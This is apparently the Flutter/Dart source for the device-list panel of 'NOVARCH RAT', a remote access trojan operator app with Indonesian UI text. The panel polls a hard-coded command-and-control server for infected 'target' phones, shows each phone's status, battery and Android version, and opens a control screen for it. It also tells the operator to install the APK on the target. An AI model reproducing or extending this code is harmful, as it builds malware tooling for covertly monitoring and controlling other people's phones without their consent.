// ============================================================================
// devices_panel.dart — NOVARCH RAT DEVICES PANEL
// ============================================================================

import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

import 'controller.dart';

const String BaseUrl = "http://cp.zyrostore.id:3448";

// ============ THEME COLORS ============
class AppColors {
  static const Color bgMain = Color(0xFFF2F5F8);
  static const Color bgSurface = Colors.white;
  static const Color textMain = Color(0xFF1E293B);
  static const Color textSub = Color(0xFF64748B);
  static const Color accentBlue = Color(0xFF3B82F6);
  static const Color accentPurple = Color(0xFF8B5CF6);
  static const Color borderColor = Color(0xFFE2E8F0);
  static const Color success = Color(0xFF22C55E);
  static const Color danger = Color(0xFFEF4444);
}

class DevicesPanelPage extends StatefulWidget {
  final String? username;
  final String? sessionKey;
  final String? role;
  final String? uid;

  const DevicesPanelPage({
    super.key,
    this.username,
    this.sessionKey,
    this.role,
    this.uid,
  });

  @override
  State<DevicesPanelPage> createState() => _DevicesPanelPageState();
}

class _DevicesPanelPageState extends State<DevicesPanelPage> {
  List<dynamic> _devices = [];
  String? _sessionKey;
  String _resolvedUid = '';
  String _userRole = 'user';
  String _username = 'PANXX';
  Timer? _pollingTimer;
  bool _isLoading = true;
  bool _isDisposed = false;
  String? _errorMessage;

  // ─── SAFE PARSERS ──────────────────────────────────────────────
  int _parseInt(dynamic val, {int fallback = 0}) {
    if (val == null) return fallback;
    if (val is int) return val;
    if (val is double) return val.toInt();
    if (val is String) return int.tryParse(val.trim()) ?? fallback;
    return fallback;
  }

  String _safeStr(dynamic val, {String fallback = ''}) {
    if (val == null) return fallback;
    final s = val.toString().trim();
    if (s.isEmpty || s == 'null' || s == 'undefined') return fallback;
    return s;
  }

  // ─── ONLINE CHECK (FIXED) ──────────────────────────────────────
  bool _isDeviceOnline(dynamic device) {
    if (device == null || device is! Map) return false;
    try {
      final status = device['status'];
      // Server kirim status sebagai String: 'Online' / 'Offline'
      if (status is String) {
        if (status.trim().toLowerCase() == 'online') return true;
        if (status.trim().toLowerCase() == 'offline') {
          // Fallback: cek lastSeen untuk konfirmasi
          return _isRecentlySeen(device['lastSeen']);
        }
      }
      if (status is bool) return status;
      if (status is Map && status['connected'] == true) return true;
      if (device['online'] == true) return true;

      // Fallback terakhir: lastSeen
      return _isRecentlySeen(device['lastSeen']);
    } catch (_) {
      return false;
    }
  }

  bool _isRecentlySeen(dynamic lastSeen) {
    if (lastSeen == null) return false;
    try {
      final dt = DateTime.parse(lastSeen.toString());
      final diff = DateTime.now().difference(dt).inSeconds;
      return diff >= 0 && diff < 60; // online kalau < 60 detik
    } catch (_) {
      return false;
    }
  }

  // ─── BOOT ──────────────────────────────────────────────────────
  @override
  void initState() {
    super.initState();
    _bootSequence();
  }

  Future<void> _bootSequence() async {
    try {
      final prefs = await SharedPreferences.getInstance();

      // Session key
      _sessionKey = widget.sessionKey;
      if (_sessionKey == null || _sessionKey!.isEmpty) {
        _sessionKey = prefs.getString('key');
      }

      // Role & Username
      _userRole =
          (widget.role ?? prefs.getString('role') ?? 'user').toLowerCase().trim();
      _username = widget.username ?? prefs.getString('username') ?? 'PANXX';

      // UID — multi-fallback
      final candidates = <String>[
        _safeStr(widget.uid),
        _safeStr(prefs.getString('uid')),
        _safeStr(prefs.getString('userUid')),
        _safeStr(prefs.getString('user_uid')),
        _safeStr(prefs.getString('sessionUid')),
        _safeStr(prefs.getString('rat_uid')),
        _safeStr(prefs.getString('account_uid')),
      ];
      for (final c in candidates) {
        if (c.isNotEmpty) {
          _resolvedUid = c;
          break;
        }
      }

      if (_sessionKey != null && _sessionKey!.isNotEmpty) {
        await _fetchDevices();
      } else {
        _errorMessage = 'Session key tidak ditemukan. Silakan login ulang.';
      }
    } catch (e) {
      debugPrint('[DevicesPanel] boot error: $e');
      _errorMessage = 'Boot error: $e';
    } finally {
      if (!_isDisposed && mounted) {
        setState(() => _isLoading = false);
      }
    }

    // Polling tetap jalan walau ada error
    _pollingTimer?.cancel();
    _pollingTimer = Timer.periodic(const Duration(seconds: 3), (_) {
      if (!_isDisposed && mounted) _fetchDevices();
    });
  }

  // ─── FETCH DEVICES ─────────────────────────────────────────────
  Future<void> _fetchDevices() async {
    if (_sessionKey == null || _sessionKey!.isEmpty) return;
    try {
      final response = await http
          .get(
            Uri.parse("$BaseUrl/api/list-targets"),
            headers: {"x-auth-token": _sessionKey!},
          )
          .timeout(const Duration(seconds: 8));

      if (_isDisposed || !mounted) return;

      if (response.statusCode == 200) {
        final decoded = jsonDecode(response.body);
        if (decoded is List) {
          // Filter out invalid entries
          final cleaned = decoded
              .where((d) => d != null && d is Map)
              .toList(growable: false);
          setState(() {
            _devices = cleaned;
            _isLoading = false;
            _errorMessage = null;
          });
        } else {
          setState(() {
            _isLoading = false;
            _errorMessage = 'Response bukan List';
          });
        }
      } else if (response.statusCode == 401) {
        setState(() {
          _isLoading = false;
          _errorMessage = 'Session expired. Login ulang.';
        });
      } else {
        setState(() => _isLoading = false);
      }
    } catch (e) {
      debugPrint('[DevicesPanel] fetch error: $e');
      if (!_isDisposed && mounted) {
        setState(() {
          _isLoading = false;
          // Jangan set error message untuk network hiccup
        });
      }
    }
  }

  void _copyUid(String uid, {String label = 'UID'}) {
    if (uid.isEmpty || uid == '-' || uid == 'Belum tersedia') {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text('UID belum tersedia'),
          backgroundColor: AppColors.danger,
          behavior: SnackBarBehavior.floating,
        ),
      );
      return;
    }
    Clipboard.setData(ClipboardData(text: uid));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('$label disalin ke clipboard'),
        backgroundColor: AppColors.success,
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  void _openControl(Map<String, dynamic> device) {
    try {
      Navigator.push(
        context,
        MaterialPageRoute(
          builder: (_) => ControllerPage(
            device: device,
            sessionKey: _sessionKey,
          ),
        ),
      ).then((_) => _fetchDevices());
    } catch (e) {
      debugPrint('[DevicesPanel] open control error: $e');
    }
  }

  @override
  void dispose() {
    _isDisposed = true;
    _pollingTimer?.cancel();
    super.dispose();
  }

  // ═══════════════════════════════════════════════════════════════
  //  BUILD
  // ═══════════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.bgMain,
      body: Stack(
        children: [
          // Grid background (safe)
          Positioned.fill(
            child: IgnorePointer(
              child: CustomPaint(painter: GridBackgroundPainter()),
            ),
          ),

          // Main content
          SafeArea(
            child: RefreshIndicator(
              color: AppColors.accentBlue,
              onRefresh: () async {
                try {
                  await _fetchDevices();
                } catch (_) {}
              },
              child: SingleChildScrollView(
                physics: const AlwaysScrollableScrollPhysics(
                  parent: BouncingScrollPhysics(),
                ),
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    _buildTopBar(),
                    const SizedBox(height: 16),
                    _buildProfileCard(),
                    const SizedBox(height: 12),
                    _buildUidCard(),
                    const SizedBox(height: 12),
                    _buildBannerCard(),
                    const SizedBox(height: 24),
                    if (_errorMessage != null) _buildErrorCard(),
                    if (_isLoading)
                      _buildLoadingCard()
                    else if (_devices.isEmpty)
                      _buildEmptyDeviceCard()
                    else
                      ..._devices.asMap().entries.map((entry) {
                        return _buildDeviceCard(entry.value, entry.key);
                      }),
                    const SizedBox(height: 40),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── TOP BAR ──────────────────────────────────────────────────
  Widget _buildTopBar() {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        IconButton(
          icon: const Icon(Icons.arrow_back, color: AppColors.textMain),
          onPressed: () => Navigator.pop(context),
        ),
        const Text(
          "NOVARCH RAT",
          style: TextStyle(
            color: AppColors.textMain,
            fontSize: 16,
            fontWeight: FontWeight.w900,
            letterSpacing: 2,
            fontFamily: 'Deskripsi',
          ),
        ),
        IconButton(
          icon: const Icon(Icons.phone_android, color: AppColors.accentBlue),
          onPressed: () {},
        ),
      ],
    );
  }

  // ─── PROFILE CARD ─────────────────────────────────────────────
  Widget _buildProfileCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: AppColors.bgSurface,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: AppColors.borderColor, width: 1.5),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.03),
            offset: const Offset(0, 4),
            blurRadius: 10,
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: AppColors.bgMain,
              shape: BoxShape.circle,
              border: Border.all(color: AppColors.borderColor, width: 1.5),
            ),
            child: const Icon(Icons.settings_remote,
                color: AppColors.accentBlue, size: 24),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    const Text(
                      "NOVARCH",
                      style: TextStyle(
                        color: AppColors.textMain,
                        fontSize: 16,
                        fontWeight: FontWeight.w900,
                      ),
                    ),
                    const SizedBox(width: 8),
                    Container(
                      padding:
                          const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                      decoration: BoxDecoration(
                        color: AppColors.accentBlue.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                            color: AppColors.accentBlue.withOpacity(0.2)),
                      ),
                      child: const Text(
                        "CONTROLLER",
                        style: TextStyle(
                          color: AppColors.accentBlue,
                          fontSize: 10,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Row(
                  children: [
                    Container(
                      width: 8,
                      height: 8,
                      decoration: const BoxDecoration(
                        color: AppColors.success,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      "${_devices.length} perangkat",
                      style: const TextStyle(
                          color: AppColors.textSub, fontSize: 12),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── UID CARD ─────────────────────────────────────────────────
  Widget _buildUidCard() {
    final hasUid = _resolvedUid.isNotEmpty;
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: AppColors.bgSurface,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: AppColors.borderColor, width: 1.5),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.02),
            offset: const Offset(0, 2),
            blurRadius: 8,
          ),
        ],
      ),
      child: Row(
        children: [
          const Icon(Icons.fingerprint,
              color: AppColors.accentPurple, size: 24),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  'UID / ID RAT',
                  style: TextStyle(
                    color: AppColors.textSub,
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 2),
                SelectableText(
                  hasUid ? _resolvedUid : 'Belum tersedia',
                  style: TextStyle(
                    color: hasUid
                        ? AppColors.textMain
                        : AppColors.textSub,
                    fontSize: 12,
                    fontWeight: FontWeight.w600,
                    fontFamily: 'monospace',
                  ),
                ),
              ],
            ),
          ),
          GestureDetector(
            onTap: () => _copyUid(_resolvedUid, label: 'UID RAT'),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
              decoration: BoxDecoration(
                color: AppColors.accentPurple.withOpacity(0.1),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(
                    color: AppColors.accentPurple.withOpacity(0.2)),
              ),
              child: const Row(
                children: [
                  Icon(Icons.copy, color: AppColors.accentPurple, size: 14),
                  SizedBox(width: 4),
                  Text(
                    "SALIN",
                    style: TextStyle(
                      color: AppColors.accentPurple,
                      fontSize: 10,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── BANNER CARD ──────────────────────────────────────────────
  Widget _buildBannerCard() {
    return Container(
      height: 160,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: AppColors.borderColor, width: 1.5),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.05),
            offset: const Offset(0, 4),
            blurRadius: 10,
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: Stack(
          fit: StackFit.expand,
          children: [
            Image.asset(
              'assets/images/rat.png',
              fit: BoxFit.cover,
              errorBuilder: (_, __, ___) => Container(
                color: AppColors.accentBlue.withOpacity(0.1),
                child: const Center(
                  child: Icon(Icons.image,
                      color: AppColors.accentBlue, size: 50),
                ),
              ),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.bottomLeft,
                  end: Alignment.topRight,
                  colors: [
                    Colors.black.withOpacity(0.8),
                    Colors.black.withOpacity(0.2),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
            Positioned(
              bottom: 16,
              left: 16,
              right: 16,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Container(
                    padding:
                        const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                    decoration: BoxDecoration(
                      color: AppColors.accentBlue,
                      borderRadius: BorderRadius.circular(6),
                    ),
                    child: const Text(
                      "NOVARCH RAT · CONTROLLER",
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 8,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1,
                      ),
                    ),
                  ),
                  const SizedBox(height: 8),
                  const Text(
                    "Remote Access Tool",
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 20,
                      fontWeight: FontWeight.w900,
                    ),
                  ),
                  const SizedBox(height: 2),
                  Text(
                    "Monitor & kontrol perangkat target",
                    style: TextStyle(
                      color: Colors.white.withOpacity(0.8),
                      fontSize: 10,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── STATUS CARDS ─────────────────────────────────────────────
  Widget _buildLoadingCard() {
    return const Center(
      child: Padding(
        padding: EdgeInsets.all(32.0),
        child: CircularProgressIndicator(color: AppColors.accentBlue),
      ),
    );
  }

  Widget _buildErrorCard() {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: AppColors.danger.withOpacity(0.08),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: AppColors.danger.withOpacity(0.3)),
      ),
      child: Row(
        children: [
          const Icon(Icons.error_outline,
              color: AppColors.danger, size: 24),
          const SizedBox(width: 12),
          Expanded(
            child: Text(
              _errorMessage ?? 'Terjadi kesalahan',
              style: const TextStyle(
                  color: AppColors.danger,
                  fontSize: 12,
                  fontWeight: FontWeight.w600),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildEmptyDeviceCard() {
    return Column(
      children: [
        const SizedBox(height: 40),
        Container(
          width: 80,
          height: 80,
          decoration: BoxDecoration(
            color: AppColors.bgSurface,
            shape: BoxShape.circle,
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.05),
                offset: const Offset(0, 4),
                blurRadius: 10,
              ),
            ],
          ),
          child: const Icon(Icons.phone_android,
              color: AppColors.textSub, size: 40),
        ),
        const SizedBox(height: 16),
        const Text(
          "Belum ada perangkat",
          style: TextStyle(
            color: AppColors.textMain,
            fontSize: 16,
            fontWeight: FontWeight.bold,
          ),
        ),
        const SizedBox(height: 8),
        const Text(
          "Pasang APK pada target untuk memulai",
          style: TextStyle(color: AppColors.textSub, fontSize: 12),
        ),
        const SizedBox(height: 24),
        GestureDetector(
          onTap: () => _fetchDevices(),
          child: const Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(Icons.refresh, color: AppColors.accentBlue, size: 16),
              SizedBox(width: 6),
              Text(
                "Refresh",
                style: TextStyle(
                  color: AppColors.accentBlue,
                  fontSize: 14,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  // ─── DEVICE CARD ──────────────────────────────────────────────
  Widget _buildDeviceCard(dynamic device, int index) {
    try {
      if (device == null || device is! Map) return const SizedBox.shrink();
      final map = Map<String, dynamic>.from(device);

      final bool isOnline = _isDeviceOnline(map);
      final Color statusColor = isOnline
          ? AppColors.success
          : AppColors.danger;

      final String displayName =
          _safeStr(map['name'], fallback: _safeStr(map['model'], fallback: 'Unknown Device'));
      final int battery = _parseInt(map['battery']);
      final String androidVersion =
          _safeStr(map['androidVersion'], fallback: _safeStr(map['release'], fallback: '?'));
      final int sdkVersion = _parseInt(map['sdkVersion']);
      final String deviceUid = _safeStr(map['uid']);
      final String deviceId = _safeStr(map['id'], fallback: deviceUid);

      return Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: AppColors.bgSurface,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: AppColors.borderColor, width: 1.5),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.03),
              offset: const Offset(0, 4),
              blurRadius: 10,
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: AppColors.accentBlue.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: const Icon(Icons.phone_android,
                      color: AppColors.accentBlue, size: 24),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Expanded(
                            child: Text(
                              displayName,
                              style: const TextStyle(
                                color: AppColors.textMain,
                                fontSize: 15,
                                fontWeight: FontWeight.bold,
                              ),
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                          Container(
                            padding: const EdgeInsets.symmetric(
                                horizontal: 8, vertical: 4),
                            decoration: BoxDecoration(
                              color: statusColor.withOpacity(0.1),
                              borderRadius: BorderRadius.circular(6),
                            ),
                            child: Text(
                              isOnline ? "ONLINE" : "OFFLINE",
                              style: TextStyle(
                                color: statusColor,
                                fontSize: 10,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 4),
                      Text(
                        "Android $androidVersion • SDK $sdkVersion",
                        style: const TextStyle(
                            color: AppColors.textSub, fontSize: 11),
                      ),
                    ],
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Row(
              children: [
                const Icon(Icons.battery_charging_full,
                    size: 14, color: AppColors.textSub),
                const SizedBox(width: 4),
                Text(
                  "$battery%",
                  style: const TextStyle(
                      color: AppColors.textSub,
                      fontSize: 11,
                      fontWeight: FontWeight.bold),
                ),
                const Spacer(),
                if (deviceId.isNotEmpty) ...[
                  const Icon(Icons.fingerprint,
                      size: 14, color: AppColors.textSub),
                  const SizedBox(width: 4),
                  Text(
                    deviceId.length > 10
                        ? '${deviceId.substring(0, 10)}...'
                        : deviceId,
                    style: const TextStyle(
                        color: AppColors.textSub,
                        fontSize: 11,
                        fontFamily: 'monospace'),
                  ),
                ],
              ],
            ),
            const SizedBox(height: 12),
            SizedBox(
              width: double.infinity,
              child: ElevatedButton.icon(
                onPressed: () => _openControl(map),
                icon: const Icon(Icons.play_arrow_rounded, size: 18),
                label: const Text(
                  "CONTROL",
                  style: TextStyle(
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1,
                      fontSize: 13),
                ),
                style: ElevatedButton.styleFrom(
                  backgroundColor:
                      isOnline ? AppColors.accentBlue : AppColors.textSub,
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12),
                  ),
                  elevation: 0,
                ),
              ),
            ),
          ],
        ),
      );
    } catch (e) {
      debugPrint('[DevicesPanel] buildDeviceCard error: $e');
      return const SizedBox.shrink();
    }
  }
}

// ─── GRID BACKGROUND PAINTER (SAFE) ─────────────────────────────
class GridBackgroundPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    // SAFETY: skip kalau size invalid
    if (!size.width.isFinite ||
        !size.height.isFinite ||
        size.width <= 0 ||
        size.height <= 0) {
      return;
    }

    final paint = Paint()
      ..color = Colors.black.withOpacity(0.03)
      ..strokeWidth = 1.0;

    const double step = 30.0;
    const int maxLines = 1000; // safety cap

    int count = 0;
    for (double x = 0; x < size.width && count < maxLines; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
      count++;
    }

    count = 0;
    for (double y = 0; y < size.height && count < maxLines; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
      count++;
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}